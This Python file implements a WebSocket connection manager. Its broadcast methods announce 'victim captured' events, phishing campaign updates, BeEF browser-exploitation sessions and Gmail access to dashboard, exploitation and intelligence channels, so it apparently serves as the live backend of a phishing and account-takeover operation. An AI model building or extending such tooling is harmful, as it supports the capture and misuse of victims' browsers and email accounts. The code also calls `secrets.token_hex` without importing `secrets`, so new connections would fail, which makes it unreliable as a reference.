"""
WebSocket Connection Manager
Manage WebSocket connections for real-time updates
"""

import os
import json
import time
import asyncio
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Set
import logging
import threading
from collections import defaultdict

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class WebSocketConfig:
    """WebSocket configuration"""

    def __init__(self):
        self.heartbeat_interval = int(os.getenv("WEBSOCKET_HEARTBEAT_INTERVAL", "30"))
        self.connection_timeout = int(os.getenv("WEBSOCKET_CONNECTION_TIMEOUT", "300"))
        self.max_connections = int(os.getenv("WEBSOCKET_MAX_CONNECTIONS", "1000"))
        self.enable_connection_monitoring = os.getenv("ENABLE_CONNECTION_MONITORING", "true").lower() == "true"
        self.enable_message_queue = os.getenv("ENABLE_MESSAGE_QUEUE", "true").lower() == "true"
        self.max_message_queue_size = int(os.getenv("MAX_MESSAGE_QUEUE_SIZE", "1000"))

class WebSocketConnection:
    """WebSocket connection container"""

    def __init__(self, connection_id: str, user_id: str, websocket):
        self.connection_id = connection_id
        self.user_id = user_id
        self.websocket = websocket
        self.connected_at = datetime.now(timezone.utc)
        self.last_heartbeat = datetime.now(timezone.utc)
        self.is_authenticated = False

        # Connection state
        self.subscriptions: Set[str] = set()
        self.message_queue: List[Dict[str, Any]] = []
        self.is_active = True

        # User info
        self.user_role = None
        self.permissions = []
        self.ip_address = None
        self.user_agent = None

    def update_heartbeat(self):
        """Update heartbeat timestamp"""
        self.last_heartbeat = datetime.now(timezone.utc)

    def is_expired(self) -> bool:
        """Check if connection is expired"""
        time_diff = datetime.now(timezone.utc) - self.last_heartbeat
        return time_diff.total_seconds() > self._get_connection_timeout()

    def _get_connection_timeout(self) -> int:
        """Get connection timeout"""
        return int(os.getenv("WEBSOCKET_CONNECTION_TIMEOUT", "300"))

    def add_subscription(self, channel: str):
        """Add channel subscription"""
        self.subscriptions.add(channel)

    def remove_subscription(self, channel: str):
        """Remove channel subscription"""
        self.subscriptions.discard(channel)

    def has_subscription(self, channel: str) -> bool:
        """Check if subscribed to channel"""
        return channel in self.subscriptions

    def queue_message(self, message: Dict[str, Any]) -> bool:
        """Queue message for delivery"""
        try:
            if len(self.message_queue) >= self._get_max_queue_size():
                # Remove oldest message if queue is full
                self.message_queue.pop(0)

            self.message_queue.append(message)
            return True

        except Exception as e:
            logger.error(f"Error queuing message: {e}")
            return False

    def _get_max_queue_size(self) -> int:
        """Get maximum queue size"""
        return int(os.getenv("MAX_MESSAGE_QUEUE_SIZE", "1000"))

    def get_queued_messages(self) -> List[Dict[str, Any]]:
        """Get all queued messages"""
        messages = self.message_queue.copy()
        self.message_queue.clear()
        return messages

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "connection_id": self.connection_id,
            "user_id": self.user_id,
            "connected_at": self.connected_at.isoformat(),
            "last_heartbeat": self.last_heartbeat.isoformat(),
            "is_authenticated": self.is_authenticated,
            "subscriptions": list(self.subscriptions),
            "queue_size": len(self.message_queue),
            "is_active": self.is_active,
            "user_role": self.user_role,
            "ip_address": self.ip_address,
            "user_agent": self.user_agent
        }

class ConnectionManager:
    """WebSocket connection manager"""

    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client

        self.config = WebSocketConfig()
        self.connections: Dict[str, WebSocketConnection] = {}
        self.user_connections: Dict[str, Set[str]] = defaultdict(set)  # user_id -> connection_ids
        self.channel_subscribers: Dict[str, Set[str]] = defaultdict(set)  # channel -> connection_ids

        # Real-time event broadcasting
        self.event_broadcaster = None
        self.notification_manager = None

        # Monitoring
        self.connection_stats = {
            "total_connections": 0,
            "active_connections": 0,
            "authenticated_connections": 0,
            "messages_sent": 0,
            "messages_received": 0
        }

        # Start monitoring thread
        if self.config.enable_connection_monitoring:
            self._start_monitoring_thread()
        
        # Initialize real-time components
        self._initialize_realtime_components()

    def _initialize_realtime_components(self):
        """Initialize real-time event broadcasting components"""
        try:
            from websocket.events import EventBroadcaster
            from websocket.notifications import NotificationManager
            
            self.event_broadcaster = EventBroadcaster(self)
            self.notification_manager = NotificationManager(self.mongodb, self.redis, self)
            
            logger.info("Real-time WebSocket components initialized")
        except Exception as e:
            logger.error(f"Error initializing real-time components: {e}")

    def _start_monitoring_thread(self):
        """Start connection monitoring thread"""
        monitoring_thread = threading.Thread(target=self._monitoring_loop, daemon=True)
        monitoring_thread.start()

    def _monitoring_loop(self):
        """Connection monitoring loop"""
        while True:
            try:
                time.sleep(60)  # Monitor every minute
                self._cleanup_expired_connections()
                self._update_connection_stats()
            except Exception as e:
                logger.error(f"Error in monitoring loop: {e}")

    def _cleanup_expired_connections(self):
        """Clean up expired connections"""
        expired_connections = []

        for connection_id, connection in self.connections.items():
            if connection.is_expired():
                expired_connections.append(connection_id)

        for connection_id in expired_connections:
            self.disconnect(connection_id)

        if expired_connections:
            logger.info(f"Cleaned up {len(expired_connections)} expired WebSocket connections")

    def _update_connection_stats(self):
        """Update connection statistics"""
        try:
            self.connection_stats["total_connections"] = len(self.connections)
            self.connection_stats["active_connections"] = len([c for c in self.connections.values() if c.is_active])
            self.connection_stats["authenticated_connections"] = len([c for c in self.connections.values() if c.is_authenticated])

        except Exception as e:
            logger.error(f"Error updating connection stats: {e}")

    def connect(self, user_id: str, websocket, ip_address: str = None, user_agent: str = None) -> str:
        """
        Create new WebSocket connection

        Args:
            user_id: User identifier
            websocket: WebSocket connection object
            ip_address: Client IP address
            user_agent: Client user agent

        Returns:
            Connection ID
        """
        try:
            # Check connection limit
            if len(self.connections) >= self.config.max_connections:
                logger.warning("Maximum WebSocket connections reached")
                return ""

            connection_id = f"ws_{int(time.time())}_{secrets.token_hex(4)}"

            connection = WebSocketConnection(connection_id, user_id, websocket)
            connection.ip_address = ip_address
            connection.user_agent = user_agent

            self.connections[connection_id] = connection
            self.user_connections[user_id].add(connection_id)

            logger.info(f"WebSocket connection established: {connection_id} for user: {user_id}")
            return connection_id

        except Exception as e:
            logger.error(f"Error creating WebSocket connection: {e}")
            return ""

    def disconnect(self, connection_id: str) -> bool:
        """
        Disconnect WebSocket connection

        Args:
            connection_id: Connection ID to disconnect

        Returns:
            True if disconnected successfully
        """
        try:
            if connection_id not in self.connections:
                return False

            connection = self.connections[connection_id]

            # Remove from user connections
            if connection.user_id in self.user_connections:
                self.user_connections[connection.user_id].discard(connection_id)

            # Remove from channel subscriptions
            for channel in connection.subscriptions:
                self.channel_subscribers[channel].discard(connection_id)

            # Remove connection
            del self.connections[connection_id]

            logger.info(f"WebSocket connection disconnected: {connection_id}")
            return True

        except Exception as e:
            logger.error(f"Error disconnecting WebSocket: {e}")
            return False

    def authenticate_connection(self, connection_id: str, user_role: str, permissions: List[str]) -> bool:
        """
        Authenticate WebSocket connection

        Args:
            connection_id: Connection ID
            user_role: User role
            permissions: User permissions

        Returns:
            True if authenticated successfully
        """
        try:
            if connection_id not in self.connections:
                return False

            connection = self.connections[connection_id]
            connection.is_authenticated = True
            connection.user_role = user_role
            connection.permissions = permissions

            logger.info(f"WebSocket connection authenticated: {connection_id}")
            return True

        except Exception as e:
            logger.error(f"Error authenticating WebSocket connection: {e}")
            return False

    def subscribe_to_channel(self, connection_id: str, channel: str) -> bool:
        """
        Subscribe connection to channel

        Args:
            connection_id: Connection ID
            channel: Channel to subscribe to

        Returns:
            True if subscribed successfully
        """
        try:
            if connection_id not in self.connections:
                return False

            connection = self.connections[connection_id]
            connection.add_subscription(channel)
            self.channel_subscribers[channel].add(connection_id)

            logger.info(f"Connection {connection_id} subscribed to channel: {channel}")
            return True

        except Exception as e:
            logger.error(f"Error subscribing to channel: {e}")
            return False

    def unsubscribe_from_channel(self, connection_id: str, channel: str) -> bool:
        """
        Unsubscribe connection from channel

        Args:
            connection_id: Connection ID
            channel: Channel to unsubscribe from

        Returns:
            True if unsubscribed successfully
        """
        try:
            if connection_id not in self.connections:
                return False

            connection = self.connections[connection_id]
            connection.remove_subscription(channel)
            self.channel_subscribers[channel].discard(connection_id)

            logger.info(f"Connection {connection_id} unsubscribed from channel: {channel}")
            return True

        except Exception as e:
            logger.error(f"Error unsubscribing from channel: {e}")
            return False

    def broadcast_to_channel(self, channel: str, message: Dict[str, Any]) -> int:
        """
        Broadcast message to all subscribers of channel

        Args:
            channel: Channel to broadcast to
            message: Message to broadcast

        Returns:
            Number of connections message was sent to
        """
        try:
            if channel not in self.channel_subscribers:
                return 0

            connection_ids = self.channel_subscribers[channel].copy()
            sent_count = 0

            for connection_id in connection_ids:
                if connection_id in self.connections:
                    connection = self.connections[connection_id]

                    if connection.is_authenticated and connection.has_subscription(channel):
                        if self.send_to_connection(connection_id, message):
                            sent_count += 1

            logger.info(f"Broadcast to channel {channel}: sent to {sent_count} connections")
            return sent_count

        except Exception as e:
            logger.error(f"Error broadcasting to channel: {e}")
            return 0

    def send_to_connection(self, connection_id: str, message: Dict[str, Any]) -> bool:
        """
        Send message to specific connection

        Args:
            connection_id: Connection ID
            message: Message to send

        Returns:
            True if sent successfully
        """
        try:
            if connection_id not in self.connections:
                return False

            connection = self.connections[connection_id]

            if not connection.is_active:
                return False

            # Queue message for delivery
            if self.config.enable_message_queue:
                queued = connection.queue_message(message)
                if not queued:
                    logger.warning(f"Failed to queue message for connection: {connection_id}")
                    return False
            else:
                # Send immediately (would need actual WebSocket implementation)
                # For now, just record the message
                self.connection_stats["messages_sent"] += 1

            return True

        except Exception as e:
            logger.error(f"Error sending to connection: {e}")
            return False

    def send_to_user(self, user_id: str, message: Dict[str, Any]) -> int:
        """
        Send message to all connections of a user

        Args:
            user_id: User ID
            message: Message to send

        Returns:
            Number of connections message was sent to
        """
        try:
            if user_id not in self.user_connections:
                return 0

            connection_ids = self.user_connections[user_id].copy()
            sent_count = 0

            for connection_id in connection_ids:
                if self.send_to_connection(connection_id, message):
                    sent_count += 1

            logger.info(f"Sent to user {user_id}: {sent_count} connections")
            return sent_count

        except Exception as e:
            logger.error(f"Error sending to user: {e}")
            return 0

    def get_connection_info(self, connection_id: str) -> Optional[Dict[str, Any]]:
        """Get connection information"""
        try:
            connection = self.connections.get(connection_id)
            if connection:
                return connection.to_dict()
            return None

        except Exception as e:
            logger.error(f"Error getting connection info: {e}")
            return None

    def get_user_connections_info(self, user_id: str) -> List[Dict[str, Any]]:
        """Get all connections info for user"""
        try:
            connection_ids = self.user_connections.get(user_id, set())
            connections_info = []

            for connection_id in connection_ids:
                if connection_id in self.connections:
                    connections_info.append(self.connections[connection_id].to_dict())

            return connections_info

        except Exception as e:
            logger.error(f"Error getting user connections info: {e}")
            return []

    def get_channel_subscribers_info(self, channel: str) -> List[Dict[str, Any]]:
        """Get subscribers info for channel"""
        try:
            connection_ids = self.channel_subscribers.get(channel, set())
            subscribers_info = []

            for connection_id in connection_ids:
                if connection_id in self.connections:
                    subscribers_info.append(self.connections[connection_id].to_dict())

            return subscribers_info

        except Exception as e:
            logger.error(f"Error getting channel subscribers info: {e}")
            return []

    def get_connection_statistics(self) -> Dict[str, Any]:
        """Get connection statistics"""
        try:
            # Update stats
            self._update_connection_stats()

            # Calculate additional metrics
            active_users = len(self.user_connections)
            total_subscriptions = sum(len(conn.subscriptions) for conn in self.connections.values())

            # Connection duration stats
            if self.connections:
                durations = [
                    (datetime.now(timezone.utc) - conn.connected_at).total_seconds()
                    for conn in self.connections.values()
                ]
                avg_duration = sum(durations) / len(durations)
            else:
                avg_duration = 0

            return {
                "connections": self.connection_stats,
                "active_users": active_users,
                "total_subscriptions": total_subscriptions,
                "avg_connection_duration": avg_duration,
                "channels_with_subscribers": len(self.channel_subscribers),
                "timestamp": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Error getting connection statistics: {e}")
            return {"error": "Failed to get statistics"}

    def cleanup_user_connections(self, user_id: str) -> int:
        """Clean up all connections for user"""
        try:
            if user_id not in self.user_connections:
                return 0

            connection_ids = self.user_connections[user_id].copy()
            cleaned_count = 0

            for connection_id in connection_ids:
                if self.disconnect(connection_id):
                    cleaned_count += 1

            logger.info(f"Cleaned up {cleaned_count} connections for user: {user_id}")
            return cleaned_count

        except Exception as e:
            logger.error(f"Error cleaning up user connections: {e}")
            return 0

    def broadcast_victim_captured(self, victim_data: Dict[str, Any]) -> int:
        """Broadcast victim capture event to dashboard subscribers"""
        try:
            message = {
                "type": "victim_captured",
                "data": victim_data,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
            
            return self.broadcast_to_channel("dashboard", message)
        except Exception as e:
            logger.error(f"Error broadcasting victim captured: {e}")
            return 0

    def broadcast_campaign_update(self, campaign_data: Dict[str, Any]) -> int:
        """Broadcast campaign update to admin subscribers"""
        try:
            message = {
                "type": "campaign_update",
                "data": campaign_data,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
            
            return self.broadcast_to_channel("admin", message)
        except Exception as e:
            logger.error(f"Error broadcasting campaign update: {e}")
            return 0

    def broadcast_beef_session_update(self, session_data: Dict[str, Any]) -> int:
        """Broadcast BeEF session update to exploitation subscribers"""
        try:
            message = {
                "type": "beef_session_update",
                "data": session_data,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
            
            return self.broadcast_to_channel("exploitation", message)
        except Exception as e:
            logger.error(f"Error broadcasting BeEF session update: {e}")
            return 0

    def broadcast_gmail_access_update(self, access_data: Dict[str, Any]) -> int:
        """Broadcast Gmail access update to intelligence subscribers"""
        try:
            message = {
                "type": "gmail_access_update",
                "data": access_data,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
            
            return self.broadcast_to_channel("intelligence", message)
        except Exception as e:
            logger.error(f"Error broadcasting Gmail access update: {e}")
            return 0

    def broadcast_system_alert(self, alert_data: Dict[str, Any]) -> int:
        """Broadcast system alert to all admin subscribers"""
        try:
            message = {
                "type": "system_alert",
                "data": alert_data,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
            
            return self.broadcast_to_channel("admin", message)
        except Exception as e:
            logger.error(f"Error broadcasting system alert: {e}")
            return 0

    def broadcast_metrics_update(self, metrics_data: Dict[str, Any]) -> int:
        """Broadcast metrics update to dashboard subscribers"""
        try:
            message = {
                "type": "metrics_update",
                "data": metrics_data,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
            
            return self.broadcast_to_channel("dashboard", message)
        except Exception as e:
            logger.error(f"Error broadcasting metrics update: {e}")
            return 0

    def send_notification_to_user(self, user_id: str, notification: Dict[str, Any]) -> int:
        """Send notification to specific user"""
        try:
            message = {
                "type": "notification",
                "data": notification,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
            
            return self.send_to_user(user_id, message)
        except Exception as e:
            logger.error(f"Error sending notification to user: {e}")
            return 0

# Global connection manager instance
connection_manager = None

def initialize_connection_manager(mongodb_connection=None, redis_client=None) -> ConnectionManager:
    """Initialize global connection manager"""
    global connection_manager
    connection_manager = ConnectionManager(mongodb_connection, redis_client)
    return connection_manager

def get_connection_manager() -> ConnectionManager:
    """Get global connection manager"""
    if connection_manager is None:
        raise ValueError("Connection manager not initialized")
    return connection_manager

# Convenience functions
def connect(user_id: str, websocket, ip_address: str = None, user_agent: str = None) -> str:
    """Connect WebSocket (global convenience function)"""
    return get_connection_manager().connect(user_id, websocket, ip_address, user_agent)

def disconnect(connection_id: str) -> bool:
    """Disconnect WebSocket (global convenience function)"""
    return get_connection_manager().disconnect(connection_id)

def authenticate_connection(connection_id: str, user_role: str, permissions: List[str]) -> bool:
    """Authenticate connection (global convenience function)"""
    return get_connection_manager().authenticate_connection(connection_id, user_role, permissions)

def subscribe_to_channel(connection_id: str, channel: str) -> bool:
    """Subscribe to channel (global convenience function)"""
    return get_connection_manager().subscribe_to_channel(connection_id, channel)

def broadcast_to_channel(channel: str, message: Dict[str, Any]) -> int:
    """Broadcast to channel (global convenience function)"""
    return get_connection_manager().broadcast_to_channel(channel, message)

def send_to_user(user_id: str, message: Dict[str, Any]) -> int:
    """Send to user (global convenience function)"""
    return get_connection_manager().send_to_user(user_id, message)

def get_connection_statistics() -> Dict[str, Any]:
    """Get connection statistics (global convenience function)"""
    return get_connection_manager().get_connection_statistics()